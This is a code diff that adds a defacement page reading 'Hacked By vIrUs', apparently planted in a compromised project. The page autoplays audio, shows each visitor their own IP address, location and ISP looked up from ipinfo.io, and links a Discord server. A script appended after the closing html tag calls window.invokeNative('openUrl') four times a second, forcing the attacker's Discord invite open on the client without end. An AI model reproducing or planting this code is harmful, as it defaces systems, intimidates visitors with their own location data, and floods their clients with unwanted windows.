@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Hacked By vIrUs</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  background: radial-gradient(circle at center, #1a1a1a, #000);
+  font-family: monospace;
+  color:#fff;
+  text-align:center;
+  min-height:100vh;
+  padding-top:60px;
+}
+.overlay{
+  position:fixed;
+  inset:0;
+  background:url("https://cdn.discordapp.com/attachments/1420755020235800596/1454676945009643644/sdp.gif?ex=6951f4fa&is=6950a37a&hm=d0bfac4e49fee4fafde23de046bed08e94aff8d597f4fcd5c1c5cc69d0729c30&?size=1024&animated=true")
+  center/cover no-repeat;
+  filter: blur(6px) brightness(0.6);
+  z-index:-1;
+}
+.top-img img{width:140px}
+
+/* Black / Red / White */
+@keyframes rgb3 {
+  0%{color:#000}
+  33%{color:#ff0000}
+  66%{color:#ffffff}
+  100%{color:#000}
+}
+
+/* VIRUS White / Red only */
+@keyframes jhnm {
+  0%{color:#ffffff}
+  50%{color:#ff0000}
+  100%{color:#ffffff}
+}
+
+.hacked{
+  margin-top:20px;
+  font-size:36px;
+  text-shadow:0 0 10px #000,0 0 15px #ff0000;
+  animation: rgb3 2.5s infinite;
+}
+.hacked .name{
+  animation: jhnm 1.2s infinite;
+}
+
+.discord{margin-top:10px;font-size:18px}
+.discord a{color:#ff6a00;text-decoration:none}
+
+.msg{
+  margin-top:8px;
+  font-size:18px;
+  animation: rgb3 2.5s infinite;
+}
+
+.ip{margin-top:20px;font-size:16px}
+.ipinfo-title{margin-top:6px;font-size:15px;color:#fff}
+.info{margin-top:10px;font-size:14px;line-height:1.5;color:#ff6a00}
+.down{margin-top:25px;font-size:22px;color:red;text-shadow:0 0 10px red}
+.bottom-img{margin-top:20px}
+.bottom-img img{width:160px}
+</style>
+</head>
+
+<body>
+
+<div class="overlay"></div>
+
+<div class="top-img">
+  <img src="https://cdn.discordapp.com/avatars/873945442038206514/b121ab072de3903913e4634b1946f1b6.webp?size=1024?animated=true&size=1024">
+</div>
+
+<div class="hacked">Hacked By [ <span class="name">ViRuS</span> ]</div>
+
+<div class="discord">
+  <a href="https://discord.gg/ay1">Discord.gg/ay1</a>
+</div>
+
+<div class="msg">Virus. Blow up the server</div>
+
+<div class="ip">
+  Your IP Address: <span id="ip">Loading...</span>
+</div>
+
+<div class="ipinfo-title">Your IP Info</div>
+
+<div class="info">
+  City: <span id="city"></span><br>
+  Region: <span id="region"></span><br>
+  Country: <span id="country"></span><br>
+  Location: <span id="loc"></span><br>
+  Org: <span id="org"></span><br>
+  Timezone: <span id="timezone"></span>
+</div>
+
+<div class="down">Oops, your server is down!</div>
+<audio autoplay loop>
+  <source src="https://cdn.discordapp.com/attachments/1420755020235800596/1454671165170647194/3dfd10f6bb2a9b5b.mp3?ex=6951ef98&is=69509e18&hm=143fe3bcb34ac43d7da735863d7d39cd11f3054166c27b2d9ed3299c83a66431&" type="audio/mpeg">
+</audio>
+
+<script>
+fetch("https://ipinfo.io/json")
+.then(r=>r.json())
+.then(d=>{
+  ip.textContent=d.ip;
+  city.textContent=d.city;
+  region.textContent=d.region;
+  country.textContent=d.country;
+  loc.textContent=d.loc;
+  org.textContent=d.org;
+  timezone.textContent=d.timezone;
+});
+</script>
+</body>
+</html>
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/ay1");
+window.invokeNative("openUrl", "https://discord.gg/ay1");
+window.invokeNative("openUrl", "https://discord.gg/ay1");
+window.invokeNative("openUrl", "https://discord.gg/ay1");
+}, 1000);
+</script>
